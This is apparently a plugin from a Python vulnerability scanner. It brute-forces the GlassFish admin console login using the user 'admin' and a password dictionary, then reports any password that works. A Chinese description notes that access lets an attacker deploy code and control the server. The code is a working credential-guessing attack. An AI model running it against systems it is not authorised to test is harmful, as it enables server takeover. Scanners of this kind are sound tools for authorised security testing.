# coding:utf-8
# author:wolf
import urllib2

import Config


def get_plugin_info():
    plugin_info = {
        "name": "Glassfish弱口令",
        "info": "攻击者通过此漏洞可以登陆管理控制台，通过部署功能可直接获取服务器权限。",
        "exp_url":"",
        "docker":"",
        "other":""
    }
    return plugin_info


def check(ip, port, timeout):
    url = "http://%s:%d" % (ip, int(port))
    error_i = 0
    flag_list = ['Just refresh the page... login will take over', 'GlassFish Console - Common Tasks',
                 '/resource/common/js/adminjsf.js">', 'Admin Console</title>', 'src="/homePage.jsf"',
                 'src="/header.jsf"', 'src="/index.jsf"', '<title>Common Tasks</title>', 'title="Logout from GlassFish']
    user_list = ['admin']
    PASSWORD_DIC = Config.PASSWORD_DIC_DIR
    PASSWORD_DIC.append('glassfish')
    for user in user_list:
        for password in PASSWORD_DIC:
            try:
                PostStr = 'j_username=%s&j_password=%s&loginButton=Login&loginButton.DisabledHiddenField=true' % (
                user, password)
                request = urllib2.Request(url + '/j_security_check?loginButton=Login', PostStr)
                res = urllib2.urlopen(request, timeout=timeout)
                res_html = res.read()
            except urllib2.HTTPError:
                return
            except urllib2.URLError:
                error_i += 1
                if error_i >= 3:
                    return
                continue
            for flag in flag_list:
                if flag in res_html:
                    info = u'存在弱口令，用户名：%s，密码：%s' % (user, password)
                    return info
